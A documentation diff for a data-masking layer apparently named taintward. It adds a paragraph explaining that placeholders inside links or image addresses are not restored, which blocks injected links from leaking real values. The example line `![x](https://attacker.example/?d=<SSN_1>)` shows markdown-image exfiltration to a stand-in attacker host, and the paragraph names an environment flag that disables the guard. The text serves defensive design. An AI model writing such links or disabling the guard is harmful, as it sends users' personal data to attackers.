@@ -44,6 +44,13 @@ sees it. A tool that receives a placeholder in its arguments gets what its
 own destination allows: the token for `internal`, the mask for `external`,
 the real value for an argument on its `allow` list.
 
+A placeholder the model writes inside a link or image address
+(`![x](https://attacker.example/?d=<SSN_1>)`, an `href`, a bare
+`https://...` word) is not restored. Otherwise an injected link would carry
+the real value out as soon as the answer is rendered. It stays a
+placeholder and the model span gets `taintward.placeholders.blocked`.
+`TAINTWARD_RESTORE_IN_URLS=1` turns this off.
+
 What placeholders still reveal: the type of data (`<SSN_1>` says an SSN was
 shared), how many values there are and which repeat, and the text around
 them. Only detected values are replaced.
